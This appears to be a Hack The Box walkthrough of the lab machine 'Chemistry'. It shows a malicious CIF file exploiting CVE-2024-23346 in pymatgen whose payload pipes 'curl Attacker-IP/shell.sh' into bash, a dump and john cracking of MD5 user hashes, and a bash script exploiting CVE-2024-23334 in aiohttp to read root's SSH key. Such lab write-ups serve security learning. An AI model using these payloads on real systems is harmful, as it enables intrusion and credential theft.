---
title: "Chemistry"
---

# Chemistry

![Cap dashboard screenshot](chemistry.png)

Chemistry is an easy Linux Hack The Box machine that combines a malicious CIF upload attack with a local static-file path traversal issue. The path to root starts with code execution through `pymatgen` and ends by abusing `aiohttp` to read `root`’s SSH key.

## Reconnaissance

An initial scan showed SSH on port 22 and HTTP on port 5000. The web server identified itself as a Python application running with Werkzeug, and the page described a Chemistry CIF Analyzer with login and registration features.

```text
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Sun, 20 Oct 2024 20:10:02 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest:
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
```

The scan already revealed enough to suggest that the target was a Python-based web app with a file upload workflow.

## Web Enumeration

Browsing to the site showed the Chemistry CIF Analyzer landing page. After registering a new account, I gained access to an upload form for CIF files and a link to an example file.

This looked like a good place to test for parser issues, since CIF handling often depends on third-party chemistry libraries.


![Cap dashboard screenshot](chemistry-1.png)

## Initial Access

A search for CIF-related vulnerabilities quickly led to `CVE-2024-23346` https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f , a code execution issue in `pymatgen`. Because the target was clearly running Python, I used the public proof-of-concept as a starting point.

```text
exploit.cif
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__.__getattribute__ ( *[().__class__.__mro__]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"].load_module ("os").system ("curl Attacker-IP/shell.sh|/bin/bash");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Uploading the file and clicking **View** caused the target to fetch my payload and pass it to `/bin/bash`. The full path was required here, and the callback returned a shell as `app`.

## User Escalation

### Shell as rosa

Besides `app` and `root`, the system also had another interactive user: `rosa`. Since the application appeared to have user management, I checked the source files under the `app` user’s home directory and found a reference to the SQLite database in `~/instance/database.db`.

```text
sqlite3 ~/instance/database.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
 
sqlite> .tables
structure  user     
 
sqlite> select * from user;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|ryuki|fc5e038d38a57032085441e7fe7010b0
```

The hashes were 32 characters long, which strongly suggested MD5. Using `rosa`’s hash with `john` and `rockyou.txt` recovered the password `unicorniosrosados`, which let me switch to `rosa` and obtain the first flag.

```bash
john --format=Raw-MD5 \
     --fork=10 \
     --wordlist=/usr/share/wordlists/rockyou.txt \
     <(echo rosa:63ed86ee9f624c7b14f1d4f43dc251a5)
```

```text
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Node numbers 1-10 of 10 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
unicorniosrosados (rosa)
```

## Root Access

After checking the open ports on the host, I found that port 8080 was listening only on localhost. I forwarded it over SSH and opened the service in my browser. The page showed a Site Monitoring interface with several graphs.

![Cap dashboard screenshot](chemistry-2.png)

The **Start Service**, **Stop Service**, and **Check Attacks** buttons did not appear to be implemented, but **List Services** worked and returned the full list of services on the system. The `/list_services` endpoint did not accept parameters, and the JavaScript in `/assets/js/script.js` did not reveal anything useful.

Inspecting the response headers showed the backend was running `Python/3.9 aiohttp/3.9.1`. Looking up known issues for that version led to `CVE-2024-23334` https://github.com/z3rObyte/CVE-2024-23334-PoC/blob/main/exploit.sh , a path traversal flaw in static file handling.

Because the static content was being served from `assets`, I adapted the proof of concept to try reading `/root/.ssh/id_rsa`.

```bash
#!/bin/bash
 
url="http://localhost:8080"
string="../"
payload="/assets/"
file="root/.ssh/id_rsa" # without the first /
 
for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```

Running the script kept appending `../` until the traversal succeeded and the key was returned.

```text
bash exploit.sh 
[+] Testing with /assets/../root/.ssh/id_rsa
        Status code --> 404
[+] Testing with /assets/../../root/.ssh/id_rsa
        Status code --> 404
[+] Testing with /assets/../../../root/.ssh/id_rsa
        Status code --> 200
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

Saving the key locally, fixing its permissions to `600`, and using it with SSH gave me root access and the final flag.

## Attack Path

- Enumerate the target and identify SSH, HTTP, and the Python web service.
- Register on the CIF analyzer and test the upload functionality.
- Exploit `CVE-2024-23346` in `pymatgen` to gain execution as `app`.
- Extract the SQLite database and recover the `rosa` password hash.
- Crack the hash with `john` and log in as `rosa`.
- Forward localhost port `8080` and inspect the monitoring service.
- Exploit `CVE-2024-23334` in `aiohttp` to read `root`’s SSH private key.
- Use the recovered key to log in as root.

